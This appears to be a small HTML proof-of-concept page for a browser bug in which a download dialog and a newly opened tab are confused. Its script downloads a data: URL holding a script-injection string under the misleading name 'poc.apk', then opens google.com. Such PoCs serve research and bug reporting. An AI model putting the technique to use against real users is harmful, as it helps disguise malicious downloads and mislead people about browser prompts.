<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Download Dialog / Tab Confusion PoC</title>
<style>
body {
  font-family: Arial, sans-serif;
  padding: 40px;
}
button {
  padding: 14px 22px;
  font-size: 16px;
  cursor: pointer;
}
</style>
</head>
<body>

<h2>Download Dialog Timing Test</h2>
<p>
Clicking the button will trigger a download and immediately open a new tab.
Observe when and where the download dialog appears.
</p>

<button id="run">Trigger Download + Open Tab</button>

<script>
document.getElementById("run").onclick = () => {
  // 1) Trigger download (browser-controlled UI)
  const a = document.createElement("a");
  a.href = "data:text/html,\"><script>alert(1)</scritp>";
  a.download = "poc.apk";
  document.body.appendChild(a);
  a.click();
  a.remove();

  // 2) Immediately open a new tab (navigation)
  window.open("https://www.google.com", "_blank");
};
</script>

</body>
</html>